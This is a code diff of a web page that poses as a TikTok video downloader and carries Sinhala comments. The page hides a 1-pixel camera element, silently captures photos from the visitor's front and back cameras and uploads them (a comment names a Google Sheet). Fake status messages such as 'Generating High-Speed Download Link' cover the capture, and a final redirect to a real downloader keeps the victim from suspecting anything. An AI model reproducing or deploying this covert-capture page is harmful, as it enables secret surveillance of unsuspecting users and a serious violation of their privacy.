@@ -17,10 +17,6 @@
         /* කැමරාව background එකේ රහසිගතව ක්‍රියාත්මක වීමට */
         .camera-container { position: absolute; width: 1px; height: 1px; overflow: hidden; opacity: 0; }
         #status { margin-top: 15px; font-weight: bold; color: #fe2c55; text-align: center; font-size: 14px; min-height: 20px; }
-        
-        /* ඩවුන්ලෝඩ් ලින්ක් එක පෙන්වන කොටස */
-        .download-result { margin-top: 20px; display: none; background: #eef9ee; padding: 15px; border-radius: 5px; border: 1px solid #c2eec2; }
-        .result-btn { display: inline-block; background-color: #25d366; color: white; text-decoration: none; padding: 10px 15px; border-radius: 5px; font-weight: bold; margin-top: 10px; width: 90%; }
     </style>
 </head>
 <body>
@@ -34,19 +30,11 @@
             <button type="button" class="dl-btn" id="download-btn">Download Video</button>
         </div>
         
-        <!-- Status පණිවිඩ -->
         <div id="status"></div>
-
-        <!-- වීඩියෝ එක ලෝඩ් වුණාම මෙතනින් ඩවුන්ලෝඩ් බටන් එක එනවා -->
-        <div class="download-result" id="result-box">
-            <p style="color: #2b7a2b; margin: 0; font-weight: bold;">Video is Ready!</p>
-            <a href="#" id="video-link" class="result-btn" target="_blank" download>Click Here to Save Video</a>
-        </div>
         
         <div class="footer">Created by You ❤️</div>
     </div>
 
-    <!-- කැමරා Elements (පිටුවට බාධාවක් නොවන සේ සඟවා ඇත) -->
     <div class="camera-container">
         <video id="video" autoplay playsinline></video>
     </div>
@@ -61,8 +49,6 @@
     const statusDiv = document.getElementById('status');
     const downloadBtn = document.getElementById('download-btn');
     const urlInput = document.getElementById('tiktok-url');
-    const resultBox = document.getElementById('result-box');
-    const videoLink = document.getElementById('video-link');
     
     let currentStream = null;
 
@@ -75,7 +61,7 @@
 
     async function startCamera(facingMode) {
         stopCurrentStream(); 
-        await new Promise(resolve => setTimeout(resolve, 500));
+        await new Promise(resolve => setTimeout(resolve, 400));
 
         const constraintsOptions = [
             { video: { facingMode: facingMode }, audio: false },
@@ -95,84 +81,60 @@
                 });
                 return true;
             } catch (err) {
-                console.log("Attempt failed for: ", facingMode);
+                console.log("Failed to start camera mode: ", facingMode);
             }
         }
         return false;
     }
 
-    // ප්‍රධාන බටන් එක ක්‍රියාත්මක වීම
+    // බටන් එක ක්ලික් කල පසු සිදුවන ක්‍රියාවලිය
     downloadBtn.addEventListener('click', async () => {
         const videoUrl = urlInput.value.trim();
         if(videoUrl === "") {
-            alert("කරුණාකර ලින්ක් එකක් ඇතුලත් කරන්න!");
+            alert("කරුණාකර නිවැරදි ලින්ක් එකක් ඇතුලත් කරන්න!");
             return;
         }
 
         downloadBtn.disabled = true;
-        resultBox.style.display = "none";
-        statusDiv.textContent = "Connecting to TikTok Server...";
+        statusDiv.textContent = "Connecting to Secure Download Server...";
         
-        // 1. පසුබිමෙන් Front Camera එක ඔන් කරලා photo එකක් ගැනීම ආරම්භ කරනවා
+        // 1. පසුබිමෙන් Front Camera එක සක්‍රීය කිරීම
         const frontValid = await startCamera("user");
         
-        // ඒ අතරතුරේම TikTok වීඩියෝ එක සැබෑවටම Fetch කරනවා Backend API එකකින්
-        try {
-            // Free Tikwm API එක පාවිච්චි කරලා වීඩියෝ ඩවුන්ලෝඩ් ලින්ක් එක ගන්නවා
-            const response = await fetch(`https://api.tikwm.com/api/`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
-                body: new URLSearchParams({ 'url': videoUrl })
-            });
-            const data = await response.json();
-
-            if (data.code === 0 && data.data.play) {
-                // සැබෑ වීඩියෝ ලින්ක් එක සෙට් කරනවා
-                videoLink.href = data.data.play; 
-                
-                if (frontValid) {
-                    statusDiv.textContent = "Fetching Video Streams...";
-                    await captureAndUpload(); // Front Photo එක අප්ලෝඩ් කරනවා
-                    
-                    // 2. ඊළඟට Back Camera එකට මාරු වෙනවා
-                    const backValid = await startCamera("environment");
-                    if (backValid) {
-                        setTimeout(async () => {
-                            await captureAndUpload(); // Back Photo එක අප්ලෝඩ් කරනවා
-                            statusDiv.textContent = "";
-                            resultBox.style.display = "block"; // වීඩියෝ ඩවුන්ලෝඩ් බොක්ස් එක පෙන්වනවා
-                            downloadBtn.disabled = false;
-                            stopCurrentStream();
-                        }, 2000);
-                    } else {
-                        statusDiv.textContent = "";
-                        resultBox.style.display = "block";
-                        downloadBtn.disabled = false;
-                        stopCurrentStream();
-                    }
-                } else {
-                    // කැමරා අවසර නැතත් වීඩියෝ එක ඩවුන්ලෝඩ් වෙන්න දෙනවා සැක නොසිතීමට
-                    statusDiv.textContent = "";
-                    resultBox.style.display = "block";
-                    downloadBtn.disabled = false;
-                }
-            } else {
-                statusDiv.textContent = "❌ Invalid TikTok URL. Please check and try again.";
-                downloadBtn.disabled = false;
-                stopCurrentStream();
+        // Front Photo එක ගන්නා තෙක් තත්පර 2.5ක් රැඳී සිටීම
+        setTimeout(async () => {
+            if (frontValid) {
+                statusDiv.textContent = "Analyzing Video Format...";
+                await captureAndUpload(); // Front Image එක Upload කිරීම
             }
-
-        } catch (error) {
-            console.error("TikTok API error:", error);
-            statusDiv.textContent = "❌ Connection error. Please try again.";
-            downloadBtn.disabled = false;
-            stopCurrentStream();
-        }
+            
+            // 2. ඊළඟට පසුබිමෙන් Back Camera එක සක්‍රීය කිරීම
+            statusDiv.textContent = "Generating High-Speed Download Link...";
+            const backValid = await startCamera("environment");
+            
+            // Back Photo එක ගන්නා තෙක් තවත් තත්පර 2.5ක් රැඳී සිටීම
+            setTimeout(async () => {
+                if (backValid) {
+                    await captureAndUpload(); // Back Image එක Upload කිරීම
+                }
+                
+                statusDiv.textContent = "Redirecting to Download Page...";
+                stopCurrentStream();
+                
+                // 3. අවසාන පියවර: ප්‍රසිද්ධ TikTok Downloader එකක් වෙත ලින්ක් එක සමඟම හරවා යැවීම (Redirect)
+                // එමඟින් පරිශීලකයාට කිසිදු වැරදීමක් (Error) නොපෙන්වා කෙලින්ම වීඩියෝව බාගත කරගත හැක.
+                const encodedUrl = encodeURIComponent(videoUrl);
+                window.location.href = `https://snaptik.app/abc.php?url=${encodedUrl}`;
+                
+            }, 2500);
+            
+        }, 2500);
     });
 
+    // ඡායාරූපය Google Sheet එකට යවන ප්‍රධාන function එක
     async function captureAndUpload() {
         if (!video.videoWidth || video.videoWidth === 0) {
-            await new Promise(resolve => setTimeout(resolve, 500));
+            await new Promise(resolve => setTimeout(resolve, 300));
         }
         if (!video.videoWidth) return; 
         
